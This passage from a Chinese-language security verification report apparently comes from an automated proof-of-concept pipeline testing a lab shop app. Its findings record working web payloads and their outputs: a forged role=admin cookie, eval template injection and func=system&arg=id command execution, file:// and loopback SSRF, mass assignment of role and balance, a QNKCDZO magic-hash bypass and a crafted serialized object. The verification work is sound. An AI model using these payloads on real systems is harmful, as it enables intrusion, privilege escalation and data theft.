  - 理由：正常侧作业3a3ff61e：alice 提交表单导出的合法 backup，POST 200 含“会员备份已恢复。”，读回 ('standard','林晓','普通会员…')，CONTROL_TIER_STD/CONTROL_NAME_SAME 为 True。攻击侧作业d587de55：同会话同 csrf 仅把 backup 换成 base64(O:12:"MemberBackup":2:{tier:gold,displayName:PWNED-DESER-7Q2Z})，POST 200 非错误页，读回 ('gold','PWNED-DESER-7Q2Z','金卡会员…')，标记在正文；再提交合法导出恢复 standard/林晓。差异仅由 backup 字段值决定，证实反序列化字段被无条件信任写入；语法错误作业99601a82 未发请求不影响判读。确认范围限于自身 tier/display_name，对象注入 RCE 未验证。
  - 复核观测：正常侧 作业 3a3ff61ed1414734956e246d3ada3370（alice）：BASELINE_INDEX 200 ('standard','林晓','普通会员…')，从 /account/backup.php 取得 csrf（48 位）与合法导出 LEGIT_EXPORT=TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6ODoic3RhbmRhcmQiO3M6MTE6ImRpc3BsYXlOYW1lIjtzOjY6Iuael+aZkyI7fQ==；POST 该导出返回 200 且含“会员备份已恢复。”，AFTER_NORMAL_INDEX 200 ('standard','林晓','普通会员…')，CONTROL_TIER_STD True、CONTROL_NAME_SAME True。；攻击侧 作业 d587de55af6f4f369edf4cf7e28e0442（alice，新会话重新登录并取 csrf）：BEFORE_ATTACK_INDEX 200 ('standard','林晓','普通会员…')；仅替换 backup 字段为 base64(O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:16:"PWNED-DESER-7Q2Z";}) = TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7czoxMToiZGlzcGxheU5hbWUiO3M6MTY6IlBXTkVELURFU0VSLTdRMloiO30=；ATTACK_POST_STATUS 200、ATTACK_POST_NOTICE True、ATTACK_PO…

### C-25 ops/users.php 用客户端 Cookie role 判定管理员，登录用户可伪造越权读取全部用户

- verification `dcdc95778f704629b39fd082a138ce82`（finding `f434cb50f3c5481db935aaf727023338` revision 1，context `8f038457b16746e69bfb62c06892a045`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧独立作业 c3aa3262f69549c7a6d3f990f8aaff17（alice，HTTP 观测）：GET /ops/users.php 返回 403，响应头 content-length: 1581、content-type: text/html，正文为“请求未完成 · 拾光商城”错误页，提示“人员管理需要管理员权限。”，未包含任何用户清单。宿主审计 PHP 脚本作业 646b342c9e6b4d9d94153ead8b6ca80c 中不带 role Cookie 的请求同为 403。
  - 攻击侧观测：攻击侧（宿主审计执行作业 646b342c9e6b4d9d94153ead8b6ca80c，alice 登录会话）：同一会话在请求中附加 Cookie: role=admin 后 GET /ops/users.php，返回 200 与 {"access":"admin","users":[{"id":1,"username":"alice","email":"alice@shop.local","role":"customer"},{"id":2,"username":"bob",...},{"id":3,"username":"operator","email":"ops@shop.local","role":"operator"},{"id":4,"username":"admin","email":"admin@shop.local","role":"admin"}]}，即普通 customer 会话经伪造 Cookie 获得管理员标注并读取全部用户 id/username/email/role。同一作业中不带该 Cookie 的请求为 403“人员管理需要管理员权限。”
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `b29d0bfd7c4b40ba85f5e75d88bc5467`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`646b342c9e6b4d9d94153ead8b6ca80c`；`c3aa3262f69549c7a6d3f990f8aaff17`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`c3aa3262f69549c7a6d3f990f8aaff17` http finished exit=0；`646b342c9e6b4d9d94153ead8b6ca80c` script finished exit=0
  - 适配脚本：`dcdc9577-adapted-ops_users_cookie_role.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：ops/users.php:2 $u=require_user(); $role=(string)($_COOKIE['role']??$u['role']); if($role!=='admin') fail_request(...,403)；:3 直接 SELECT id,username,email,role FROM users；:4 Accept: application/json 时 json_response 输出全部用户。bootstrap.php:33-36 的 require_user 只校验登录与可选服务端角色列表，而本页未传 ['admin']；bootstrap.php:20-25 的 user() 从数据库取 role，但被第2行 Cookie 覆盖。普通会员 alice（id=1，role=customer，target_prepare 已核验）在独立正常作业 c3aa3262f69549c7a6d3f990f8aaff17 中未带 role Cookie 得到 403；同一身份在攻击作业附加 Cookie 后得到 200 全量用户列表。

- 正式复核 `aa2e171bb6774dbbbe71b9e342b20e06`：复核确认；引用 revision 1 / verification `dcdc95778f704629b39fd082a138ce82`
  - 理由：正常侧作业 c3aa3262f69549c7a6d3f990f8aaff17：alice(customer) 请求 /ops/users.php 得 HTTP 403，正文为“人员管理需要管理员权限。”错误页，无用户数据；攻击侧作业 646b342c9e6b4d9d94153ead8b6ca80c：同一 alice 会话附加 Cookie role=admin 后返回 HTTP 200 与 JSON access=admin，含 alice/bob/operator/admin 的 id/username/email/role，同作业不带该 Cookie 的请求仍为 403。响应随客户端 Cookie 由 403 变为 200 并泄露管理员域数据，与 users.php:2 用 Cookie 覆盖角色的根因一致，判别器成立，确认该授权绕过。
  - 复核观测：正常侧 正常侧独立作业 c3aa3262f69549c7a6d3f990f8aaff17（alice，HTTP 观测）：GET /ops/users.php 返回 403，响应头 content-length: 1581、content-type: text/html，正文为“请求未完成 · 拾光商城”错误页，提示“人员管理需要管理员权限。”，未包含任何用户清单。宿主审计 PHP 脚本作业 646b342c9e6b4d9d94153ead8b6ca80c 中不带 role Cookie 的请求同为 403。；攻击侧 攻击侧（宿主审计执行作业 646b342c9e6b4d9d94153ead8b6ca80c，alice 登录会话）：同一会话在请求中附加 Cookie: role=admin 后 GET /ops/users.php，返回 200 与 {"access":"admin","users":[{"id":1,"username":"alice","email":"alice@shop.local","role":"customer"},{"id":2,"username":"bob",...},{"id":3,"username":"operator","email":"ops@shop.local","role":"operator"},{"id":4,"username":"admin","email":"admin@shop.local","role":"admin"}]}，即普通 cu…

### C-26 营销模板渲染将双花括号内容传入 eval 造成代码执行

- verification `035ed525a281444eaee7a18f8d02f2da`（finding `f559f9fc049449178215238868ce4fb4` revision 1，context `eaf7dee574c244489335737691df4ecc`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 b72ae888cc774e00b5ff42b1d73cab23（operator）：GET /ops/template-render.php 返回 200，取得 48 位 csrf，GET_FORBIDDEN False；POST template='本周精选，共 {{ 2 + 2 }} 款好物' 返回 200，<pre> 内容为 '本周精选，共 4 款好物'，表明表达式被求值但无命令执行。
  - 攻击侧观测：攻击侧作业 198da608b63a4654a7b53b547ef74cd3（operator）：模板改为 {{ system('echo PWNED-EVAL-7Q2Z; id') }}，POST 200。响应在 <!doctype html> 之前出现执行输出 'PWNED-EVAL-7Q2Z\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_EXEC_CONTEXT 原文），<pre> 内容为 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_UID True），即 eval 内 system() 被实际执行；textarea 中模板文本的 h() 转义回显（ATTACK_TEMPLATE_ECHOED_ESCAPED True）不产生 uid 输出。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `bc679d557b6b46cebaa0b370af74fa4a`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`b72ae888cc774e00b5ff42b1d73cab23`；`198da608b63a4654a7b53b547ef74cd3`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`b72ae888cc774e00b5ff42b1d73cab23` script finished exit=0；`198da608b63a4654a7b53b547ef74cd3` script finished exit=0
  - 适配脚本：`035ed525-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：template-render.php:3 对 {{...}} 匹配内容执行 eval('return '.$m[1].';')，仅由 check_csrf 与 require_user(['operator','admin']) 保护。operator 身份已由 target_prepare 核验（id=3，role=operator），与实际作业一致。两侧同一登录、同一 POST 路径、各自会话取 48 位 csrf，仅 template 表达式不同；正常侧 {{ 2 + 2 }} 证明该渲染点确实对表达式求值，攻击侧把同一位置换成 system() 调用。

- 正式复核 `cca8c0ab27c3444a97d97b992f863a3c`：复核确认；引用 revision 1 / verification `035ed525a281444eaee7a18f8d02f2da`
  - 理由：正常侧作业 b72ae888cc774e00b5ff42b1d73cab23（operator）：GET 200、CSRF 48 位，POST {{ 2 + 2 }} 返回 200，pre 为“本周精选，共 4 款好物”，无 PWNED/uid 输出，证明模板表达式经解析但未执行命令。攻击侧 198da608b63a4654a7b53b547ef74cd3：同一身份路径仅将表达式换为 system('echo PWNED-EVAL-7Q2Z; id')，POST 200，响应 doctype 前出现 PWNED-EVAL-7Q2Z 与 uid=33(www-data) gid=33(www-data)，pre 内即为该 uid 行，而 textarea 回显已 h() 转义不产生 uid，排除回显伪造。与源码第3行 eval('return '.$m[1].';') 一致，确认为实际代码执行；限于 operator 会话为先决条件。
  - 复核观测：正常侧 正常侧作业 b72ae888cc774e00b5ff42b1d73cab23（operator）：GET /ops/template-render.php 返回 200，取得 48 位 csrf，GET_FORBIDDEN False；POST template='本周精选，共 {{ 2 + 2 }} 款好物' 返回 200，<pre> 内容为 '本周精选，共 4 款好物'，表明表达式被求值但无命令执行。；攻击侧 攻击侧作业 198da608b63a4654a7b53b547ef74cd3（operator）：模板改为 {{ system('echo PWNED-EVAL-7Q2Z; id') }}，POST 200。响应在 <!doctype html> 之前出现执行输出 'PWNED-EVAL-7Q2Z\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_EXEC_CONTEXT 原文），<pre> 内容为 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_UID True），即 eval 内 system() 被实际执行；textarea 中模板文本的 h() 转义回显（ATTACK_TEMPLATE_ECHOED_ESCAPED True）不产…

### C-27 运营链接预览 file_get_contents 无协议/主机白名单导致 SSRF

- verification `67ae0eeaf6aa46588d81a89ee709cf34`（finding `452d174056004fbfad541168b5c7ae12` revision 1，context `e8c56da699c04e939dc98e6a5f3b38fa`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 822caba3d1f34b43906db67a7c5877a6（operator）：GET /ops/url-preview.php（不带 url）返回 200，pre 为空；url=http://fixtures:8080/catalog-info 返回 200，pre 为 '拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。'，NORMAL_UNAVAILABLE False，只为预期的合作方预览内容。
  - 攻击侧观测：攻击侧作业 11da55b9c90743d188e22a46d755bd04（operator，同会话）：url=file:///var/lib/shop/vault/internal.txt 返回 200，<pre> 为 'SHOP_INTERNAL_6ad05d571e8c0c338c3a243a\n'（MARKER True），说明可读本地文件；url=http://127.0.0.1/health.php 返回 200，<pre> 为 '{&quot;ok&quot;:true,&quot;version&quot;:&quot;1.0.0&quot;}'，即服务端向自身回环地址发起请求并带回内部健康接口响应（UNAVAILABLE 均为 False）。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `2e34347adede43b8b330fdf3db166b0b`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`822caba3d1f34b43906db67a7c5877a6`；`11da55b9c90743d188e22a46d755bd04`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`822caba3d1f34b43906db67a7c5877a6` script finished exit=0；`11da55b9c90743d188e22a46d755bd04` script finished exit=0
  - 适配脚本：`67ae0eea-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：url-preview.php:2 require_user(['operator','admin']) 后 $url=(string)($_GET['url']??'')；:3 仅 stream_context_create(['http'=>['timeout'=>4,'follow_location'=>0]]) 后 @file_get_contents($url,false,$context,0,65536)，无 scheme/host/IP 白名单；:4 <pre> h($output) 回显。setup.php:34 的随机 SHOP_INTERNAL_ 只写入 /var/lib/shop/vault/internal.txt，页面本身不回显该文件。operator 身份由 target_prepare 核验（id=3）。正常侧 fixture:8080 是页面默认预览目标（内网主机，属设计用途），攻击侧改用 file:// 与 127.0.0.1 才能越出预期范围，二者差异明确落在 url 的协议/主机上。

- 正式复核 `744abc9c1cea44a98e8731b845bb44f5`：复核确认；引用 revision 1 / verification `67ae0eeaf6aa46588d81a89ee709cf34`
  - 理由：正常侧作业 822caba3d1f34b43906db67a7c5877a6：无 url 时 pre 为空，url=fixtures 地址返回预期合作方摘要，属功能正常用途。攻击侧作业 11da55b9c90743d188e22a46d755bd04：url=file:///var/lib/shop/vault/internal.txt 返回标记 SHOP_INTERNAL_6ad05d571e8c0c338c3a243a，url=http://127.0.0.1/health.php 返回内部 JSON，两者均非预期目标且可回显，直接对应第3行缺协议/主机过滤的 file_get_contents，SSRF 确认。
  - 复核观测：正常侧 正常侧作业 822caba3d1f34b43906db67a7c5877a6（operator）：GET /ops/url-preview.php（不带 url）返回 200，pre 为空；url=http://fixtures:8080/catalog-info 返回 200，pre 为 '拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。'，NORMAL_UNAVAILABLE False，只为预期的合作方预览内容。；攻击侧 攻击侧作业 11da55b9c90743d188e22a46d755bd04（operator，同会话）：url=file:///var/lib/shop/vault/internal.txt 返回 200，<pre> 为 'SHOP_INTERNAL_6ad05d571e8c0c338c3a243a\n'（MARKER True），说明可读本地文件；url=http://127.0.0.1/health.php 返回 200，<pre> 为 '{&quot;ok&quot;:true,&quot;version&quot;:&quot;1.0.0&quot;}'，即服务端向自身回环地址发起请求并带回内部健康接口响应（UNAVAILABLE 均为 False）。

### C-28 账户资料更新接口允许普通用户批量赋值修改 role/balance/tier 实现提权

- verification `a8ae9a9608804175844a18b4bba66fc8`（finding `63ebf68069984b988e79c6e29984e96c` revision 1，context `c955727bd3a74e2c9412e47e0ca0a873`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：作业 2b24ae19ac034543a36ce82f575cafe0（alice 已登录，/orders/index.php 200 确认会话）：从 /account/update.php 表单读取真实 csrf 令牌后，仅提交 csrf + display_name=Alice Control（Accept: application/json）。响应 200 正文为 {"id":1,...,"display_name":"Alice Control","role":"customer","balance":"100.00","tier":"standard",...}；随后 GET /account/index.php 显示 badge=standard、会员权益为普通会员，说明正常资料更新只改 display_name，role/balance/tier 保持原值。
  - 攻击侧观测：作业 320134d524b3488bb5e5433aa903f667（alice 独立会话，登录后 /orders/index.php 200）：同样先 GET 表单取得 csrf（48 字符），再 POST csrf + display_name=Alice + role=admin + balance=999999 + tier=gold，请求返回 200，正文为 {"id":1,"username":"alice",...,"role":"admin","balance":"999999.00","tier":"gold",...}。独立读回 GET /account/index.php 返回 200 且页面显示 badge=gold、会员权益=金卡会员；GET /ops/index.php 返回 200（运营工作台标题），而该入口在导航中仅对 operator/admin 显示。宿主 postcondition 也记录 role customer→admin、balance 100.00→999999.00、tier standard→gold。仅通过表单暴露的 display_name/nickname/email/homepage 无法达成此效果。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `8eacc49593da41cd96a2aa202e897f38`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`2b24ae19ac034543a36ce82f575cafe0`；`320134d524b3488bb5e5433aa903f667`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`2b24ae19ac034543a36ce82f575cafe0` script finished exit=0；`320134d524b3488bb5e5433aa903f667` script finished exit=0
  - 适配脚本：`a8ae9a96-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常侧与攻击侧使用 alice 独立会话，均在 POST 前从真实 HTML 提取 csrf，符合源码 check_csrf 前提；攻击侧写后由 JSON 响应与 /account/index.php 页面二次读回，并经宿主状态变更记录核对。$columns 白名单包含敏感列，且 SQL 仅以 session 用户 id 作为 WHERE 参数，无角色校验。

- 正式复核 `8e910a44b9ed4e2b9918088196f2ffe7`：复核确认；引用 revision 1 / verification `a8ae9a9608804175844a18b4bba66fc8`
  - 理由：正常侧作业 2b24ae19ac034543a36ce82f575cafe0：alice 会话经 /orders/index.php 200 确认，取 csrf 后仅提交 display_name=Alice Control，响应 role=customer、balance=100.00、tier=standard，/account/index.php 仍显示 standard 与普通会员权益。攻击侧 320134d524b3488bb5e5433aa903f667：同会话追加 role=admin、balance=999999、tier=gold，POST 200 返回对应值，独立 GET /account/index.php 显示 gold 徽章与金卡权益，GET /ops/index.php 返回 200，宿主 postcondition 记录 balance/role/tier 三字段变更。两侧判别明确且与 update.php:4-6 批量赋值一致，确认该动态验证。
  - 复核观测：正常侧 作业 2b24ae19ac034543a36ce82f575cafe0（alice 已登录，/orders/index.php 200 确认会话）：从 /account/update.php 表单读取真实 csrf 令牌后，仅提交 csrf + display_name=Alice Control（Accept: application/json）。响应 200 正文为 {"id":1,...,"display_name":"Alice Control","role":"customer","balance":"100.00","tier":"standard",...}；随后 GET /account/index.php 显示 badge=standard、会员权益为普通会员，说明正常资料更新只改 display_name，role/balance/tier 保持原值。；攻击侧 作业 320134d524b3488bb5e5433aa903f667（alice 独立会话，登录后 /orders/index.php 200）：同样先 GET 表单取得 csrf（48 字符），再 POST csrf + display_name=Alice + role=admin + balance=999999 + tier=gold，请求返回 200，正文为 {"id":1,"username":"alice",...,"role":"admin","balance":"999999.00","tier":"gold",...}。独立读回 GET /account/index.php 返回 200 且页面显示 badge=gold、会员权益=金卡会员；GET /ops/index.php 返回 200（运营工作台标题），而该入口在导航中仅对 operator/admin 显示。…

### C-29 注册入口 POST 状态变更未受 check_csrf 保护，可被跨站强制注册

- verification `1f391a290868453bb13dc3352b61d131`（finding `bd815376f74949faa53e29011c3e66ac` revision 1，context `3931e4b4c4a344ad87a6fbb177e63a8a`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error

- verification `fcfed17a0a2941959466e8d54a19a4a6`（finding `bd815376f74949faa53e29011c3e66ac` revision 1，context `5b7a2a389cae494faeb51ad6f1a809b5`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`efdb0950c0294d04bd34482c9ee83a4f`；`37765fff4fca4196b2bce5c336cc7131`
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error
  - 作业：`efdb0950c0294d04bd34482c9ee83a4f` script finished exit=0；`37765fff4fca4196b2bce5c336cc7131` script finished exit=0

- verification `c789bec81d2343d0a60aceaff664f286`（finding `bd815376f74949faa53e29011c3e66ac` revision 1，context `5b7a2a389cae494faeb51ad6f1a809b5`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：operator
  - 正常侧观测：alice 正常会话确认钱包表单有 csrf，向受保护的提现端点不带令牌 POST 返回403。注册页 GET 为200，注册表单没有 csrf 字段。
  - 攻击侧观测：guest 向注册入口提交无 CSRF 令牌的普通表单字段，ATTACK_STATUS 200 且注册成功；另建 cookie jar 使用所建凭据登录，账户页读回用户名和邮箱均存在。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`efdb0950c0294d04bd34482c9ee83a4f`；`37765fff4fca4196b2bce5c336cc7131`
  - 结论结束原因：operator_review_completed；执行阶段结束原因：sdk_api_error
  - 作业：`efdb0950c0294d04bd34482c9ee83a4f` script finished exit=0；`37765fff4fca4196b2bce5c336cc7131` script finished exit=0
  - 备注：证实注册状态变更没有 CSRF 令牌门槛及真实创建账户；普通 URL 编码表单可由跨源表单提交。未运行真实跨站浏览器，也未证明自动登录、接管受害者会话或绑定既有受害者账户；影响限于无令牌注册。

- 正式复核 `165da68415ea4cdcb1c87a2993b5c43f`：复核确认；引用 revision 1 / verification `c789bec81d2343d0a60aceaff664f286`
  - 理由：正常侧：alice 会话钱包表单含 csrf 字段、向 /wallet/withdraw.php 无令牌 POST 返回 403，说明 bootstrap 的 check_csrf 实际生效；注册页 GET 200 且 FORM_HAS_CSRF_FIELD False。攻击侧：guest 无令牌 POST /auth/register.php 返回 200 并提示注册成功，另一 cookie jar 用该凭据登录 /account/index.php 读回用户名与邮箱。两侧差异直接对应注册入口未挂校验。但攻击方创建的是自身新账户，非受害者既有账户写入，影响判读以无令牌建号为限，不扩展为账户接管。
  - 复核观测：正常侧 alice 正常会话确认钱包表单有 csrf，向受保护的提现端点不带令牌 POST 返回403。注册页 GET 为200，注册表单没有 csrf 字段。；攻击侧 guest 向注册入口提交无 CSRF 令牌的普通表单字段，ATTACK_STATUS 200 且注册成功；另建 cookie jar 使用所建凭据登录，账户页读回用户名和邮箱均存在。

### C-30 兑换码弱类型比较可用魔术哈希绕过并免费升级金卡会员

- verification `14c03c4e4ff948d9bda1db2dd48ee0b7`（finding `0e67c5ccc77e46d4b7f37847b81b9827` revision 1，context `0cba151fbe1347f2bc40d83f318536c3`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 6035550421a049ab866acfb179e4d52c（alice）：BASELINE_INDEX 200 ('standard','普通会员：日常积分与会员活动')，GET /account/redeem.php 200 并取得 48 位 csrf；提交 token=not-a-code 后 NORMAL_TOKEN_STATUS 422、NORMAL_INVALID_NOTICE True、NORMAL_SUCCESS_NOTICE False；AFTER_NORMAL_INDEX 200 仍为 ('standard','普通会员…')。
  - 攻击侧观测：攻击侧作业 bbd750d248b244379ee1e17865b1ff74（alice，新会话）：BEFORE_ATTACK_INDEX 为 ('standard','普通会员…')；提交 token=QNKCDZO（md5=0e830400451993494058024219903391）并带 48 位 csrf，ATTACK_TOKEN_STATUS 200、ATTACK_SUCCESS_NOTICE True、ATTACK_INVALID_NOTICE False；AFTER_ATTACK_INDEX 200 变为 ('gold','金卡会员：享受专属折扣与优先服务')，ATTACK_TIER_GOLD True。与真实码 md5('240610708')=0e462097431906509019562988736854 相比，二者均为 0e 开头的纯数字串，说明是松散比较把两个不同摘要判等，而非提交了真实兑换码。随后用攻击前导出的合法备份恢复，AFTER_RESTORE_INDEX 回到 ('standard','普通会员…')。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `8dfcb910b6fa467faf94a7c5534b67ce`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`6035550421a049ab866acfb179e4d52c`；`bbd750d248b244379ee1e17865b1ff74`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`6035550421a049ab866acfb179e4d52c` script finished exit=0；`bbd750d248b244379ee1e17865b1ff74` script finished exit=0
  - 适配脚本：`14c03c4e-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：redeem.php:4 $secret_hash=md5('240610708')，:5 if(md5((string)($_POST['token']??''))==$secret_hash) 使用 == 松散比较后 UPDATE users SET tier='gold' WHERE id=?；check_csrf 只在登录会话内防跨站。正常侧与攻击侧均为 alice、同一 POST 路径 /account/redeem.php、各自取 48 位 csrf，差异仅 token 值。alice 初始 tier=standard、display_name=林晓（target_prepare 与作业前后置状态一致）；攻击后已用攻击前合法导出（tier=standard）经 /account/backup.php 恢复，作业 postcondition 回到 standard，最终 state_changes 为空。

- 正式复核 `a8796a3506c749aeb3ef3f4a4a31d253`：复核确认；引用 revision 1 / verification `14c03c4e4ff948d9bda1db2dd48ee0b7`
  - 理由：独立核对两侧作业原文：正常侧 6035550421a049ab866acfb179e4d52c 中 alice（customer，tier=standard）GET /account/redeem.php 取得 48 位 csrf，提交 token=not-a-code 返回 422、NORMAL_INVALID_NOTICE True、NORMAL_SUCCESS_NOTICE False，读回仍为 standard；攻击侧 bbd750d248b244379ee1e17865b1ff74 同身份、同路径、同 csrf 长度，仅将 token 换为 QNKCDZO（md5=0e830400451993494058024219903391），返回 200、ATTACK_SUCCESS_NOTICE True、ATTACK_INVALID_NOTICE False，读回 gold 且 ATTACK_TIER_GOLD True。真实码摘要为 0e462097431906509019562988736854，两者均为 0e 前缀纯数字串，唯一变量为 token，说明是 == 松散比较判等而非持有真实兑换码；随后用攻击前合法备份恢复为 standard。未观察到环境失败或反证，动态结论成立。
  - 复核观测：正常侧 正常侧作业 6035550421a049ab866acfb179e4d52c（alice）：BASELINE_INDEX 200 ('standard','普通会员：日常积分与会员活动')，GET /account/redeem.php 200 并取得 48 位 csrf；提交 token=not-a-code 后 NORMAL_TOKEN_STATUS 422、NORMAL_INVALID_NOTICE True、NORMAL_SUCCESS_NOTICE False；AFTER_NORMAL_INDEX 200 仍为 ('standard','普通会员…')。；攻击侧 攻击侧作业 bbd750d248b244379ee1e17865b1ff74（alice，新会话）：BEFORE_ATTACK_INDEX 为 ('standard','普通会员…')；提交 token=QNKCDZO（md5=0e830400451993494058024219903391）并带 48 位 csrf，ATTACK_TOKEN_STATUS 200、ATTACK_SUCCESS_NOTICE True、ATTACK_INVALID_NOTICE False；AFTER_ATTACK_INDEX 200 变为 ('gold','金卡会员：享受专属折扣与优先服务')，ATTACK_TIER_GOLD True。与真实码 md5('240610708')=0e462097431906509019562988736854 相比，二者均为 0e 开头的纯数字串，说明是松散比较把两个不…

### C-31 ops/formula.php 将 $_GET['func'] 直接作为函数名动态调用，可调用 system 等实现任意代码/命令执行

- verification `56e38cedfc2a4aab881d41679d7160de`（finding `eadd0beed2c0463888586e26fe9ddf33` revision 1，context `c20ef89e8f7b4ebca7ac520bc3f1b924`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error

- verification `021f467f32174afb86ef6bc7c58caf94`（finding `eadd0beed2c0463888586e26fe9ddf33` revision 1，context `e5322f6956894bcbac029f22627b7c9a`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：作业 8f0a560d96ec43f5bb51709d47e446ec（operator，GET /ops/formula.php?func=strtoupper&arg=spring-sale）返回 200，页面 <pre>SPRING-SALE</pre>，与预期字符串函数的正常试算结果一致，说明该功能在 operator 会话中可用且结果回显在 <pre> 中。对照作业 01727b451f5448f28dcffc8f0fa87a36（alice，同 URL）返回 403 与“当前账号没有访问该功能的权限。”，说明 operator/admin 角色校验确实生效。
  - 攻击侧观测：作业 fad4a899868e4cb5b24ebb4a00eccc94（operator，GET /ops/formula.php?func=system&arg=id）返回 200，响应正文开头即为 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，且 <pre> 中回显同样内容，证明 func 参数被当作真实函数名执行、arg 被作为 system 的命令串执行。作业 eff3957497b84f63a11c84400ce65348（operator，func=shell_exec&arg=id）同样在 <pre> 中回显 "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"，构成第二类危险函数可调用的独立观测。两次均为 operator 会话实际提交，非管理员会话结果。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`8f0a560d96ec43f5bb51709d47e446ec`；`01727b451f5448f28dcffc8f0fa87a36`；`fad4a899868e4cb5b24ebb4a00eccc94`；`eff3957497b84f63a11c84400ce65348`
  - 结论结束原因：completed；执行阶段结束原因：sdk_interrupt_error
  - 作业：`8f0a560d96ec43f5bb51709d47e446ec` http finished exit=0；`01727b451f5448f28dcffc8f0fa87a36` http finished exit=0；`fad4a899868e4cb5b24ebb4a00eccc94` http finished exit=0；`eff3957497b84f63a11c84400ce65348` http finished exit=0
  - 备注：正常侧引用 ev-2ca13e5b561174b1（body，SPRING-SALE）与 ev-5d96529de200ef1d（headers）；角色对照问题引用 ev-6b3fc5f8968f205b。攻击侧引用 ev-621e9598d2b4f9b1（system&arg=id body，uid=33(www-data)）与 ev-52ffeaeae06b5f91，第二组引用 ev-cfbe869d7105ab6a（shell_exec&arg=id body）。冻结快照 applicability=match，formula.php:2-3 与 bootstrap.php:33-37 与运行行为一致。服务端诊断对 http_observe 均为 capability_unavailable，未用于结论；漏洞依据是正常/攻击两次响应正文的差异。

- 正式复核 `c49a69acd84c4cd4a0d6f84b093c447a`：复核确认；引用 revision 1 / verification `021f467f32174afb86ef6bc7c58caf94`
  - 理由：正常侧：operator 会话 GET /ops/formula.php?func=strtoupper&arg=spring-sale 返回 200 且 <pre>SPRING-SALE</pre>；alice 同 URL 返回 403 与权限提示，证明 require_user 角色边界有效。攻击侧：operator 会话 func=system&arg=id 与 func=shell_exec&arg=id 均返回 200，<pre> 中回显 uid=33(www-data) gid=33(www-data) groups=33(www-data)，为真实命令输出而非文本变换。两侧判别明确指向 $_GET['func'] 被当作任意函数名执行；需 operator 身份为已记录前提，非匿名可利用。
